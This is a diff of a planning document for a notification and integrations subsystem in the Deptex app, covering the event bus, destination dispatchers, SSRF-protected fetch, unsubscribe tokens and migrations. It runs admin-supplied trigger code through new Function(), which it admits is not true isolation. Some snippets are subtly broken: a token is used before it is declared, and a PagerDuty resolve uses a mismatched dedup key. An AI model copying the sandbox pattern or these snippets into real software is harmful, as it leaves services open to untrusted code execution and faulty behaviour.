@@ -1,9 +1,60 @@
 ---
 name: Phase 9 - Notifications & Integrations
-overview: Event bus, notification dispatcher, 8 destination types, rate limiting.
+overview: Enterprise notification system with event bus, 9 destinations, user preferences, in-app notifications, rule templates, delivery tracking, and full observability.
 todos:
-  - id: phase-9-notifications
-    content: "Phase 9: Notifications & Integrations - Event bus architecture (20 event types, notification_events table, QStash async dispatch), notification dispatcher engine (org/team/project rule cascade, isolated-vm sandbox execution, deduplication), trigger code validation on save (syntax + shape + fetch resilience, reuses Phase 4 pattern), enhanced trigger context with custom return values, 8 destination dispatchers (Slack Block Kit, Discord embeds, Jira tickets, Linear issues, Asana tasks, Email HTML, Custom HMAC webhooks, PagerDuty), batching + smart grouping (30s window, critical bypass), rate limiting (per-org + per-destination), delivery tracking + notification history UI, weekly digest via QStash cron, test/preview rules with dry run, event source integration hooks across extraction/PR/vuln-monitor/policy/watchtower/AI-fix pipelines, edge cases + 50-test suite"
+  - id: phase-9a-db-migrations
+    content: "9N: Database migrations -- notification_events, notification_deliveries, user_notification_preferences, user_notifications, notification_rule_changes tables; token_expires_at, timezone, schedule_config, consecutive_failures columns; RLS policies; CHECK constraint updates"
+    status: completed
+  - id: phase-9b-event-bus
+    content: "9B: Event bus -- emitEvent(), emitEventBatch(), QStash dispatch queuing, stuck event reconciliation cron (9B.2), 33+ event types across 8 categories"
+    status: completed
+  - id: phase-9c-validation
+    content: "9D: Trigger code validation -- syntax compilation, shape validation, fetch resilience checks on save; live syntax validation (Monaco setModelMarkers); IntelliSense for context object; auto-save drafts"
+    status: completed
+  - id: phase-9d-dispatcher
+    content: "9C: Notification dispatcher engine -- rule resolution (org+team+project cascade), Function() sandbox execution, deduplication, OAuth refresh mutex, user preference checks"
+    status: completed
+  - id: phase-9e-destinations
+    content: "9F: 9 destination dispatchers -- Slack Block Kit, Discord embeds, Jira tickets, Linear issues, Asana tasks, Email HTML (with unsubscribe), Custom HMAC webhooks, PagerDuty Events API; PagerDuty connect flow (9F.10a); message length enforcement (9G.5); PII redacted mode for ticketing (9G.6)"
+    status: completed
+  - id: phase-9f-event-hooks
+    content: "9M: Event source hooks -- wire emitEvent into extraction, policy eval, PR handler, vuln monitor, watchtower, AI fix, membership, integrations, project CRUD (33+ emit points)"
+    status: completed
+  - id: phase-9g-rate-batch
+    content: "9I + 9H: Rate limiting (per-org 200/hr, per-dest 30/hr, ticketing 10/hr, Redis sorted sets) + batching (priority-based windows, critical bypass, summary format)"
+    status: completed
+  - id: phase-9h-delivery-tracking
+    content: "9J: Delivery tracking + History UI -- notification_deliveries table, paginated history API, filters, retry failed, 90-day retention cleanup cron"
+    status: completed
+  - id: phase-9i-digest
+    content: "9K: Configurable digest -- hourly QStash cron, per-rule frequency/day/hour config, digest content assembly, Slack + email templates, org timezone support"
+    status: completed
+  - id: phase-9j-test-preview
+    content: "9L: Test and preview rules -- test endpoint with sample contexts, preview UI, Send Test button with [TEST] prefix"
+    status: completed
+  - id: phase-9k-user-prefs
+    content: "9R: User notification preferences -- email opt-out, event type muting, project muting, DND schedule, digest preference; Settings page Notifications tab; unsubscribe endpoint"
+    status: completed
+  - id: phase-9l-in-app
+    content: "9S: In-app notification center -- NotificationBell in AppHeader, Supabase Realtime subscription, read/unread state, mark-all-read, browser toast"
+    status: completed
+  - id: phase-9m-mute-snooze
+    content: "9T: Mute/snooze -- rule snooze (snoozed_until), project mute (user prefs), org-level pause (notifications_paused_until)"
+    status: completed
+  - id: phase-9n-rule-features
+    content: "9U + 9W + 9X: Rule versioning (change history, revert), rule templates (8 presets), dry-run mode (evaluate without sending)"
+    status: completed
+  - id: phase-9o-operational
+    content: "9V + 9Y: Connection health monitoring (auto-disable after 3 failures), structured logging, notification health dashboard, data retention cleanup cron"
+    status: completed
+  - id: phase-9p-docs
+    content: "9Z: Documentation -- update DocsPage event types/context/destinations/validation/test/digest/rate-limits; Learn tutorials; Help Center FAQs; NotificationAIAssistant context update"
+    status: completed
+  - id: phase-9q-security
+    content: Security hardening -- email CAN-SPAM unsubscribe headers, webhook redirect blocking, secret rotation, message length caps, PII redacted mode, SSRF reuse from policy-engine.ts
+    status: completed
+  - id: phase-9r-edge-cases
+    content: "9P: 34 edge cases + 85-test suite covering event bus, dispatcher, validation, destinations, webhooks, batching, rate limiting, delivery tracking, digest, integration, SSRF, email security, RLS, user prefs, in-app, health monitoring, dry-run"
     status: pending
 isProject: false
 ---
@@ -17,7 +68,7 @@ isProject: false
 - Events are **persisted** to a `notification_events` table before dispatch (audit trail, replay, debugging)
 - Dispatch is **async via QStash** -- the event source (extraction, PR handler, etc.) fires and forgets; delivery happens in the background
 - Rule cascade is **additive**: org rules + team rules + project rules ALL fire independently (not override). Deduplication prevents the same destination receiving the same event twice
-- Trigger code runs in the **same isolated-vm sandbox** as Phase 4 policy code, with the same `fetch()` support, timeout, and memory limits
+- Trigger code runs in the **same `Function()` sandbox** as Phase 4 policy code (`ee/backend/lib/policy-engine.ts`), with the same `controlledFetch()` support (SSRF-protected via `resolveAndCheckSSRF()`), timeout limits, and fetch caps. Note: the sandbox is NOT `isolated-vm` -- it uses `new Function()`. There is no memory limit enforcement; true isolation is a Phase 14 (Enterprise Security) consideration
 - Code validation on save uses the **same 3-check pattern** as Phase 4: syntax compilation, shape validation (must return boolean or enhanced object), fetch resilience
 - **Batching** groups high-volume events (e.g., 50 deps changed in one extraction) into a single summary notification. Critical events (malicious package, CISA KEV) bypass batching for immediate delivery
 - **Rate limiting** prevents notification storms: per-org and per-destination hourly caps with burst allowance
@@ -100,20 +151,40 @@ Complete catalog of events that flow through the notification system. Each event
 | `ai_fix_completed` | AI-powered fix PR was generated for a vulnerability | AI fix pipeline (Phase 7) |
 
 
+**Membership and Organization Events:**
+
+
+| Event Type                   | Description                                           | Source                          |
+| ---------------------------- | ----------------------------------------------------- | ------------------------------- |
+| `member_invited`             | New member invited to organization                    | Organization routes             |
+| `member_joined`              | Member accepted invitation and joined org             | Invitation acceptance           |
+| `member_removed`             | Member removed from organization                     | Organization routes             |
+| `integration_connected`      | New integration connected (Slack, Jira, etc.)         | Integration OAuth callback      |
+| `integration_disconnected`   | Integration removed or revoked                        | Integration routes              |
+| `project_created`            | New project created in organization                   | Project routes                  |
+| `project_deleted`            | Project deleted from organization                     | Project routes                  |
+| `policy_code_updated`        | Organization policy code was changed                  | Policy routes (Phase 4)         |
+
+
 **System Events:**
 
 
-| Event Type           | Description                                          | Source                                                         |
-| -------------------- | ---------------------------------------------------- | -------------------------------------------------------------- |
-| `risk_score_changed` | Project health score crossed a significant threshold | Health score calculation (after extraction or vuln monitoring) |
+| Event Type                       | Description                                                            | Source                                                         |
+| -------------------------------- | ---------------------------------------------------------------------- | -------------------------------------------------------------- |
+| `risk_score_changed`             | Project health score crossed a significant threshold                   | Health score calculation (after extraction or vuln monitoring)  |
+| `extraction_started`             | Dependency extraction pipeline started                                 | Extraction worker                                              |
+| `dependency_license_changed`     | License changed in an existing dependency version                      | Extraction pipeline (diff comparison)                          |
+| `security_scan_completed`        | Semgrep/TruffleHog scan results ready                                  | Extraction pipeline (Phase 6)                                  |
+| `watchtower_analysis_completed`  | Full watchtower forensic analysis finished for a package               | Watchtower worker                                              |
+| `aegis_automation_completed`     | Aegis scheduled automation ran                                         | Aegis queue (Phase 7B)                                         |
 
 
 **Event priority classification** (used by batching engine in 9H):
 
 - **Critical** (immediate, never batched): `malicious_package_detected`, `vulnerability_discovered` with CISA KEV flag, `security_analysis_failure`
-- **High** (batched with 10s window): `vulnerability_discovered` (non-KEV critical/high), `compliance_violation`, `pr_check_completed` with failures, `ai_fix_completed`
-- **Normal** (batched with 30s window): all other events
-- **Low** (batched with 5min window): `new_version_available`, `risk_score_changed`
+- **High** (batched with 10s window): `vulnerability_discovered` (non-KEV critical/high), `compliance_violation`, `pr_check_completed` with failures, `ai_fix_completed`, `member_removed`
+- **Normal** (batched with 30s window): `dependency_added`, `dependency_updated`, `dependency_removed`, `dependency_deprecated`, `policy_violation`, `license_violation`, `status_changed`, `extraction_completed`, `extraction_failed`, `supply_chain_anomaly`, `member_invited`, `member_joined`, `integration_connected`, `integration_disconnected`, `project_created`, `project_deleted`, `policy_code_updated`, `extraction_started`, `dependency_license_changed`, `security_scan_completed`, `watchtower_analysis_completed`, `aegis_automation_completed`
+- **Low** (batched with 5min window): `new_version_available`, `risk_score_changed`, `vulnerability_resolved`, `vulnerability_severity_increased` (non-KEV)
 
 ### 9B: Event Bus Architecture
 
@@ -146,6 +217,8 @@ export async function emitEvent(event: DeptexEvent): Promise<string> {
 
   try {
     // 1. Resolve teamId from project if not provided
+    // resolveTeamId: query project_teams for the owner team (is_owner = true).
+    // Returns null if project has no owner team or projectId is null.
     const teamId = event.teamId || await resolveTeamId(event.projectId);
 
     // 2. Persist event (upsert on dedup key to prevent race conditions -- see 9N index)
@@ -250,6 +323,22 @@ async function queueNotificationDispatch(eventId: string, priority: string): Pro
 ```
 
 The delay enables batching: multiple events that arrive within the window are collected and dispatched together (see 9H).
+
+**resolveTeamId helper:**
+
+```typescript
+async function resolveTeamId(projectId?: string): Promise<string | null> {
+  if (!projectId) return null;
+  const { data } = await supabase
+    .from('project_teams')
+    .select('team_id')
+    .eq('project_id', projectId)
+    .eq('is_owner', true)
+    .limit(1)
+    .single();
+  return data?.team_id ?? null;
+}
+```
 
 **Batch event emission** for high-volume scenarios (e.g., extraction completing with 50 dep changes):
 
@@ -375,7 +464,9 @@ router.post('/reconcile-stuck-notifications', verifyQStash, async (req, res) => 
 
 ### 9B.1: Sandbox fetch() SSRF Protection
 
-The `fetch()` proxy used by trigger code (same isolated-vm sandbox as Phase 4 policy code) must block requests to private networks and cloud metadata endpoints before forwarding. This prevents malicious or careless org admins from using trigger code to probe internal infrastructure.
+**Note:** SSRF protection is **already implemented** in `ee/backend/lib/policy-engine.ts` (lines 61-106) via `resolveAndCheckSSRF()`. Phase 9 reuses this existing implementation -- no need to duplicate. The `controlledFetch()` function already calls `resolveAndCheckSSRF()` before every outbound request.
+
+The `fetch()` proxy used by trigger code (same `Function()` sandbox as Phase 4 policy code) blocks requests to private networks and cloud metadata endpoints before forwarding. This prevents malicious or careless org admins from using trigger code to probe internal infrastructure.
 
 **Blocklist (applied before connecting):**
 
@@ -496,9 +587,9 @@ dispatchNotification(eventId):
   7. For EACH custom_code_pipeline rule:
      a. Check min_depscore_threshold: if set and event is vulnerability_discovered,
         skip if depscore < threshold (fast path, no sandbox needed)
-     b. Execute rule.custom_code in isolated-vm sandbox with context
+     b. Execute rule.custom_code in Function() sandbox with context (reuses `policy-engine.ts` sandbox pattern)
         - Timeout: 10 seconds (shorter than policy's 30s -- notifications should be fast)
-        - Memory: 128MB (half of policy's 256MB -- trigger code is simpler)
+        - Max fetches: 5 per execution (half of policy's 10 -- trigger code should be simpler)
      c. If code returns truthy value:
         - If returns `true`: use default message template for this event type
         - If returns `{ notify: true, message?, title?, priority? }`: use custom message/title
@@ -754,6 +845,57 @@ In `NotificationRulesSection.tsx`, when save returns a 422 with validation error
 
 The "Save" button shows a loading state during validation, and the validation results appear in-place without closing the sidebar.
 
+**9D.6: Live validation (as-you-type)**
+
+Run a lightweight syntax check on every keystroke (debounced 500ms) using Monaco's `setModelMarkers` API. This shows red squiggly underlines for syntax errors in real-time, without waiting for save.
+
+Implementation: Compile the code in a Web Worker (to avoid blocking the UI thread) using the same `Function()` wrapping pattern as the backend. If compilation fails, extract the error line number and set a Monaco diagnostic marker. Clear markers when the code is valid.
+
+This is **syntax only** -- shape validation and fetch resilience checks still run on save (they require sandbox execution).
+
+**9D.7: IntelliSense for context object**
+
+Register the `NotificationContext` interface as a TypeScript type definition in Monaco so users get autocomplete for `context.dependency.name`, `context.vulnerability.severity`, etc.
+
+```typescript
+// In NotificationRulesSection.tsx, when initializing the Monaco editor:
+monaco.languages.typescript.javascriptDefaults.addExtraLib(`
+  declare const context: {
+    event: { type: string; timestamp: string; source: string };
+    project: {
+      id: string; name: string; asset_tier: string; asset_tier_rank: number;
+      health_score: number; status: string; status_is_passing: boolean;
+      dependencies_count: number; team_name: string | null;
+    };
+    dependency: {
+      name: string; version: string; license: string | null;
+      is_direct: boolean; is_dev_dependency: boolean; environment: string;
+      score: number; openssf_score: number | null; weekly_downloads: number | null;
+      malicious_indicator: { source: string; confidence: string; reason: string } | null;
+      slsa_level: number;
+    } | null;
+    vulnerability: {
+      osv_id: string; severity: string; cvss_score: number; epss_score: number;
+      depscore: number; is_reachable: boolean; cisa_kev: boolean;
+      fixed_versions: string[]; summary: string;
+    } | null;
+    pr: {
+      number: number; title: string; author: string; check_result: string;
+      check_summary: string; deps_added: number; deps_updated: number; deps_removed: number;
+    } | null;
+    previous: { status?: string; status_is_passing?: boolean; health_score?: number } | null;
+    batch: { total: number; by_type: Record<string, number>; events: Array<any> } | null;
+  };
+  declare function fetch(url: string, options?: any): Promise<any>;
+`, 'notification-context.d.ts');
+```
+
+This gives autocomplete, parameter hints, and type checking directly in the notification rule editor.
+
+**9D.8: Auto-save drafts**
+
+If the user navigates away while editing a rule (sidebar close, page navigation), save the draft to `localStorage` keyed by `notification-rule-draft-{orgId}-{ruleId|'new'}`. When they re-open the sidebar, check for a draft and show a banner: "You have an unsaved draft from [time]. Restore | Discard".
+
 ### 9E: Enhanced Trigger Context Object
 
 The context object passed to notification rule trigger code. This is what `context` looks like inside the user's function.
@@ -852,7 +994,7 @@ The trigger function can return:
 1. `**true`** -- send notification with default message template for this event type
 2. `**false`** -- skip notification
 3. `**{ notify: true }`** -- same as `true`
-4. `**{ notify: true, message: string }**` -- send with custom message body (replaces default template)
+4. `**{ notify: true, message: string }`** -- send with custom message body (replaces default template)
 5. `**{ notify: true, title: string }**` -- send with custom title (replaces default)
 6. `**{ notify: true, message: string, title: string, priority: 'critical' | 'high' | 'normal' | 'low' }**` -- full custom override
 
@@ -1297,7 +1439,13 @@ async function dispatchEmail(
         <p style="color: #a1a1aa; font-size: 14px; line-height: 1.6; margin: 0 0 20px 0;">${message.body}</p>
         <a href="${message.deptexUrl}" style="display: inline-block; padding: 8px 16px; background: #fafafa; color: #09090b; border-radius: 6px; text-decoration: none; font-size: 13px; font-weight: 500;">View in Deptex</a>
       </div>
-      <p style="color: #52525b; font-size: 11px; text-align: center; margin-top: 16px;">Deptex Security Notifications</p>
+      <p style="color: #52525b; font-size: 11px; text-align: center; margin-top: 16px;">
+        Deptex Security Notifications
+        <br/>
+        <a href="${APP_URL}/api/notifications/unsubscribe?token=${unsubscribeToken}" style="color: #52525b; text-decoration: underline;">Unsubscribe</a>
+        &nbsp;|&nbsp;
+        <a href="${APP_URL}/settings/notifications" style="color: #52525b; text-decoration: underline;">Notification Settings</a>
+      </p>
     </div>
   `;
 
@@ -1307,17 +1455,35 @@ async function dispatchEmail(
     .replace(/[\r\n\x00]/g, '')
     .slice(0, 978); // 978 + '[Deptex] ' prefix = under 998
 
+  // Generate a signed unsubscribe token (JWT with email + org, expires in 90 days).
+  // Used by the unsubscribe endpoint and the in-email link.
+  const unsubscribeToken = jwt.sign(
+    { email: emailAddress, orgId: connection.organization_id, type: 'unsubscribe' },
+    process.env.INTERNAL_API_KEY!,
+    { expiresIn: '90d' },
+  );
+
   try {
     await sendEmail({
       to: emailAddress,
       subject: `[Deptex] ${sanitizedTitle}`,
       html,
+      headers: {
+        // CAN-SPAM / Gmail 2024 bulk sender compliance: one-click unsubscribe
+        'List-Unsubscribe': `<${APP_URL}/api/notifications/unsubscribe?token=${unsubscribeToken}>`,
+        'List-Unsubscribe-Post': 'List-Unsubscribe=One-Click',
+      },
     });
     return { success: true };
   } catch (error: any) {
     return { success: false, error: error.message, retryable: true };
   }
 }
+
+// Unsubscribe endpoint (CE route, no auth required -- token is self-authenticating)
+// POST /api/notifications/unsubscribe?token=<jwt>
+// Adds an entry to user_notification_preferences with email_opted_out = true for the org.
+// The dispatcher checks this before sending (see 9R).
 ```
 
 **9F.9: Custom webhook dispatcher**
@@ -1359,6 +1525,8 @@ async function dispatchCustomWebhook(
   const timeout = setTimeout(() => controller.abort(), 10000);
 
   try {
+    // SECURITY: Do not follow redirects. A 3xx could redirect to an internal IP,
+    // bypassing SSRF protections. Treat redirects as delivery failures.
     const response = await fetch(webhookUrl, {
       method: 'POST',
       headers: {
@@ -1370,6 +1538,7 @@ async function dispatchCustomWebhook(
       },
       body: payload,
       signal: controller.signal,
+      redirect: 'error',  // reject redirects
     });
     clearTimeout(timeout);
 
@@ -1435,6 +1604,76 @@ async function dispatchPagerDuty(
 }
 ```
 
+**9F.10a: PagerDuty Connect Flow**
+
+PagerDuty uses the Events API v2, which requires a routing key (also called integration key). No OAuth flow needed -- the user provides the routing key directly.
+
+**Price note:** PagerDuty itself costs $21/user/month (their pricing). Document this in the integration setup UI so users know the cost is on their side.
+
+**Backend endpoint:** `POST /api/integrations/organizations/:orgId/pagerduty/connect`
+
+```typescript
+router.post('/organizations/:orgId/pagerduty/connect', authenticateUser, async (req, res) => {
+  const { orgId } = req.params;
+  const { routingKey, serviceName } = req.body;
+
+  if (!routingKey || !routingKey.startsWith('R') || routingKey.length !== 32) {
+    return res.status(400).json({ error: 'Invalid PagerDuty routing key format' });
+  }
+
+  // Test the routing key by sending a test event
+  const testResponse = await fetch('https://events.pagerduty.com/v2/enqueue', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      routing_key: routingKey,
+      event_action: 'trigger',
+      dedup_key: `deptex-test-${Date.now()}`,
+      payload: {
+        summary: 'Deptex connection test - you can resolve this incident',
+        source: 'Deptex',
+        severity: 'info',
+      },
+    }),
+  });
+
+  if (!testResponse.ok) {
+    return res.status(400).json({ error: 'PagerDuty rejected the routing key. Check the key and try again.' });
+  }
+
+  // Resolve the test incident immediately
+  await fetch('https://events.pagerduty.com/v2/enqueue', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      routing_key: routingKey,
+      event_action: 'resolve',
+      dedup_key: `deptex-test-${Date.now()}`,
+    }),
+  });
+
+  // Store as integration
+  await supabase.from('organization_integrations').upsert({
+    organization_id: orgId,
+    provider: 'pagerduty',
+    access_token: routingKey,
+    display_name: serviceName || 'PagerDuty',
+    metadata: { service_name: serviceName },
+    status: 'active',
+  }, { onConflict: 'organization_id,provider' });
+
+  res.json({ success: true });
+});
+```
+
+**Frontend:** Add PagerDuty card to Organization Settings > Integrations tab. The card shows a form with:
+- Service name input
+- Routing key input (password-masked)
+- "Connect" button that calls the endpoint above
+- "Test Connection" button (reuses the test flow)
+
+Also add PagerDuty to the `ConnectionDropdown` in `NotificationRulesSection.tsx` as a selectable destination.
+
 **9F.11: Dispatcher router**
 
 ```typescript
@@ -1489,6 +1728,43 @@ If the webhook endpoint returns 429 with a `Retry-After` header, respect it. QSt
 **9G.3: Webhook IP allowlisting**
 
 Document the IP ranges that Deptex webhooks originate from (QStash IP ranges from Upstash) so enterprise customers can allowlist them in their firewalls. Add to the Integrations docs page.
+
+**9G.4: Webhook secret rotation**
+
+Custom webhooks use a static HMAC secret (`whsec_*`). Support rotation without downtime:
+
+- Add `webhook_secret_previous` to `organization_integrations.metadata` (or a dedicated column)
+- When a user rotates the secret via `PUT /custom-integrations/:id` with `regenerateSecret: true`:
+  1. Move current `access_token` to `metadata.previous_secret`
+  2. Generate a new `access_token`
+  3. Set `metadata.secret_rotated_at` = now
+- During signature validation (webhook test), accept either the current OR previous secret for a 72-hour grace period
+- After 72 hours, `previous_secret` is cleared
+
+**9G.5: Message length enforcement**
+
+Each destination has message length limits. The dispatcher router enforces these BEFORE dispatching:
+
+| Destination | Title limit | Body limit | Enforcement |
+|-------------|-------------|------------|-------------|
+| Slack | 150 chars | 3,000 chars | Truncate with "..." + "View in Deptex" link |
+| Discord | 256 chars | 4,096 chars | Truncate embed description |
+| Jira | 255 chars | 32,767 chars | Truncate summary, use ADF for body |
+| Linear | 255 chars | 10,000 chars | Truncate |
+| Asana | 255 chars | 65,535 chars | Truncate |
+| Email | 978 chars (RFC) | No limit | Subject sanitized (existing) |
+| PagerDuty | 1,024 chars | No payload limit | Truncate summary |
+| Custom webhook | No limit | 100 KB total payload | Return error if exceeded |
+
+Implementation: `enforceMessageLimits(message, destinationType)` runs before each dispatch, truncating with a "... [truncated, view full details in Deptex]" suffix.
+
+**9G.6: PII awareness for ticketing destinations**
+
+When Jira, Linear, or Asana tickets are created, they contain project names, dependency names, and vulnerability details. These are visible to anyone with access to the external tool (which may be broader than the Deptex org).
+
+- Document this risk in the integration setup UI: "Tickets will contain dependency names and vulnerability details visible to all project members."
+- Add an optional `redacted_mode` boolean to ticketing integration metadata
+- When `redacted_mode = true`, ticket body contains only: title, severity badge, and "View details in Deptex" link (no vuln specifics, no dependency versions)
 
 ### 9H: Batching and Smart Grouping
 
@@ -1677,17 +1953,49 @@ The `weekly_digest` trigger type sends a scheduled summary of the past week's ev
 
 **9K.1: Schedule**
 
-Digest runs every Monday at 9:00 AM UTC via QStash CRON:
+A single QStash CRON runs **hourly** and checks which orgs have digests due:
 
 ```typescript
 // Register on app startup
 await qstash.schedules.create({
-  destination: `${API_BASE_URL}/api/workers/weekly-digest`,
-  cron: '0 9 * * 1', // Monday 9 AM UTC
+  destination: `${API_BASE_URL}/api/workers/digest-check`,
+  cron: '0 * * * *', // every hour on the hour
 });
 ```
 
-**Timezone handling:** The CRON runs at a fixed UTC time. The digest email and Slack message should display all timestamps formatted in the org's configured timezone. If the `organizations` table has a `timezone` column (e.g., `'America/New_York'`), use it for formatting. If the column does not exist yet, default to UTC and add per-org timezone configuration as a future enhancement (Phase 10 UI or Phase 13). The CRON itself stays at UTC -- running per-org-timezone CRONs would require one QStash schedule per org, which is impractical.
+The hourly CRON checks each org's configured digest schedule and dispatches only when due. This supports per-org digest frequency and timing without creating individual QStash schedules per org.
+
+**9K.1a: Configurable digest schedule**
+
+Each `weekly_digest` rule can optionally include a `digest_schedule` in its `custom_code` JSONB (or a new `schedule_config` column):
+
+```typescript
+interface DigestScheduleConfig {
+  frequency: 'daily' | 'weekly' | 'biweekly' | 'monthly';  // default: 'weekly'
+  day_of_week?: number;   // 0 (Sun) - 6 (Sat), default: 1 (Monday). For weekly/biweekly.
+  hour_utc: number;       // 0-23, default: 9
+}
+```
+
+The digest-check endpoint iterates over all active weekly_digest rules and dispatches for those whose schedule matches the current hour:
+
+```
+For each org with active weekly_digest rules:
+  - If frequency='daily' and current hour matches hour_utc: dispatch
+  - If frequency='weekly' and current day+hour matches: dispatch
+  - If frequency='biweekly': track last_digest_sent_at, dispatch if >= 14 days
+  - If frequency='monthly': dispatch on 1st of month at configured hour
+```
+
+**Timezone handling:** The `organizations` table does not currently have a `timezone` column. Phase 9 adds one:
+
+```sql
+ALTER TABLE organizations ADD COLUMN timezone TEXT DEFAULT 'UTC';
+```
+
+The digest timestamps in emails and Slack messages are formatted using the org's timezone. The CRON itself stays hourly in UTC -- the handler converts `hour_utc` to check against the org's local hour.
+
+Frontend: The digest rule creation sidebar shows frequency/day/time dropdowns instead of a code editor (weekly_digest rules don't use custom_code).
 
 **9K.2: Digest endpoint**
 
@@ -1971,11 +2279,99 @@ If abs(newScore - previousScore) >= 10:
   })
 ```
 
+**9M.9: Membership events**
+
+In [ee/backend/routes/organizations.ts](ee/backend/routes/organizations.ts), after member operations:
+
+```
+After POST /invitations (invite member):
+  emitEvent({ type: 'member_invited', payload: { email, role }, priority: 'normal' })
+
+After invitation acceptance (member joins):
+  emitEvent({ type: 'member_joined', payload: { userId, email, fullName }, priority: 'normal' })
+
+After DELETE /members/:memberId:
+  emitEvent({ type: 'member_removed', payload: { userId, email, removedBy }, priority: 'high' })
+```
+
+**9M.10: Integration events**
+
+In [ee/backend/routes/integrations.ts](ee/backend/routes/integrations.ts), after OAuth callbacks and disconnections:
+
+```
+After successful OAuth callback (Slack, Discord, Jira, etc.):
+  emitEvent({ type: 'integration_connected', payload: { provider, displayName }, priority: 'normal' })
+
+After DELETE /connections/:connectionId:
+  emitEvent({ type: 'integration_disconnected', payload: { provider, displayName, reason: 'manual' }, priority: 'normal' })
+```
+
+**9M.11: Project lifecycle events**
+
+In [ee/backend/routes/projects.ts](ee/backend/routes/projects.ts):
+
+```
+After POST /projects (create project):
+  emitEvent({ type: 'project_created', payload: { projectName, teamName }, priority: 'normal' })
+
+After DELETE /projects/:projectId:
+  emitEvent({ type: 'project_deleted', payload: { projectName }, priority: 'normal' })
+```
+
+**9M.12: Policy code changes**
+
+In [ee/backend/routes/organizations.ts](ee/backend/routes/organizations.ts), after policy code updates:
+
+```
+After PUT /policy-code/:codeType:
+  emitEvent({ type: 'policy_code_updated', payload: { codeType, changedBy }, priority: 'normal' })
+```
+
+**9M.13: Extraction start**
+
+In [ee/backend/lib/redis.ts](ee/backend/lib/redis.ts) `queueExtractionJob()`, after job is queued:
+
+```
+emitEvent({ type: 'extraction_started', payload: { projectName, repositoryFullName }, priority: 'normal' })
+```
+
+**9M.14: Security scan results**
+
+In the extraction worker, after Semgrep/TruffleHog scans complete:
+
+```
+emitEvent({
+  type: 'security_scan_completed',
+  payload: { semgrepFindingsCount, secretFindingsCount, newFindings, resolvedFindings },
+  priority: 'normal',
+})
+```
+
 ### 9N: Database Migrations Summary
 
 All new tables and columns added in Phase 9:
 
 ```sql
+-- 9N.0: Prerequisites -- add token_expires_at to integration tables (required by 9C.5 OAuth refresh mutex)
+ALTER TABLE organization_integrations ADD COLUMN IF NOT EXISTS token_expires_at TIMESTAMPTZ;
+ALTER TABLE team_integrations ADD COLUMN IF NOT EXISTS token_expires_at TIMESTAMPTZ;
+ALTER TABLE project_integrations ADD COLUMN IF NOT EXISTS token_expires_at TIMESTAMPTZ;
+
+-- Also update existing OAuth callbacks (Jira, Asana, Discord, GitLab, Bitbucket) to populate
+-- token_expires_at = now() + expires_in when storing tokens.
+
+-- 9N.0a: Add timezone to organizations (required by 9K configurable digest)
+ALTER TABLE organizations ADD COLUMN IF NOT EXISTS timezone TEXT DEFAULT 'UTC';
+
+-- 9N.0b: Add schedule_config to notification rules (required by 9K configurable digest)
+ALTER TABLE organization_notification_rules ADD COLUMN IF NOT EXISTS schedule_config JSONB;
+ALTER TABLE team_notification_rules ADD COLUMN IF NOT EXISTS schedule_config JSONB;
+ALTER TABLE project_notification_rules ADD COLUMN IF NOT EXISTS schedule_config JSONB;
+
+-- 9N.0c: Add consecutive_failures tracking to integrations (required by 9V connection health)
+ALTER TABLE organization_integrations ADD COLUMN IF NOT EXISTS consecutive_failures INTEGER DEFAULT 0;
+ALTER TABLE organization_integrations ADD COLUMN IF NOT EXISTS last_failure_at TIMESTAMPTZ;
+
 -- 9B: Event persistence
 CREATE TABLE notification_events (
   id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
@@ -2133,37 +2529,128 @@ CREATE POLICY "Org admins can view their org notification deliveries"
 CREATE POLICY "Service role full access to notification deliveries"
   ON notification_deliveries FOR ALL
   USING (auth.role() = 'service_role');
+
+-- 9R: User notification preferences
+CREATE TABLE user_notification_preferences (
+  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
+  user_id UUID NOT NULL REFERENCES auth.users(id) ON DELETE CASCADE,
+  organization_id UUID NOT NULL REFERENCES organizations(id) ON DELETE CASCADE,
+  email_opted_out BOOLEAN NOT NULL DEFAULT false,
+  muted_event_types TEXT[] DEFAULT '{}',
+  muted_project_ids UUID[] DEFAULT '{}',
+  dnd_start_hour INTEGER,           -- 0-23 UTC, null = no DND
+  dnd_end_hour INTEGER,             -- 0-23 UTC
+  digest_preference TEXT DEFAULT 'instant'
+    CHECK (digest_preference IN ('instant', 'daily_digest', 'weekly_digest', 'off')),
+  created_at TIMESTAMPTZ DEFAULT now(),
+  updated_at TIMESTAMPTZ DEFAULT now(),
+  UNIQUE(user_id, organization_id)
+);
+
+ALTER TABLE user_notification_preferences ENABLE ROW LEVEL SECURITY;
+
+CREATE POLICY "Users can manage their own preferences"
+  ON user_notification_preferences FOR ALL
+  USING (user_id = auth.uid());
+
+CREATE POLICY "Service role full access to notification preferences"
+  ON user_notification_preferences FOR ALL
+  USING (auth.role() = 'service_role');
+
+-- 9S: In-app notification inbox
+CREATE TABLE user_notifications (
+  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
+  user_id UUID NOT NULL REFERENCES auth.users(id) ON DELETE CASCADE,
+  organization_id UUID NOT NULL REFERENCES organizations(id) ON DELETE CASCADE,
+  event_id UUID REFERENCES notification_events(id) ON DELETE SET NULL,
+  title TEXT NOT NULL,
+  body TEXT,
+  severity TEXT DEFAULT 'info',
+  event_type TEXT,
+  project_id UUID REFERENCES projects(id) ON DELETE SET NULL,
+  deptex_url TEXT,
+  read_at TIMESTAMPTZ,
+  created_at TIMESTAMPTZ DEFAULT now()
+);
+
+CREATE INDEX idx_user_notifs_user ON user_notifications(user_id, created_at DESC);
+CREATE INDEX idx_user_notifs_unread ON user_notifications(user_id, read_at)
+  WHERE read_at IS NULL;
+
+ALTER TABLE user_notifications ENABLE ROW LEVEL SECURITY;
+
+CREATE POLICY "Users can view their own notifications"
+  ON user_notifications FOR SELECT
+  USING (user_id = auth.uid());
+
+CREATE POLICY "Users can update their own notifications"
+  ON user_notifications FOR UPDATE
+  USING (user_id = auth.uid());
+
+CREATE POLICY "Service role full access to user notifications"
+  ON user_notifications FOR ALL
+  USING (auth.role() = 'service_role');
+
+-- 9U: Notification rule change history
+CREATE TABLE notification_rule_changes (
+  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
+  rule_id UUID NOT NULL,
+  rule_scope TEXT NOT NULL CHECK (rule_scope IN ('organization', 'team', 'project')),
+  organization_id UUID NOT NULL REFERENCES organizations(id) ON DELETE CASCADE,
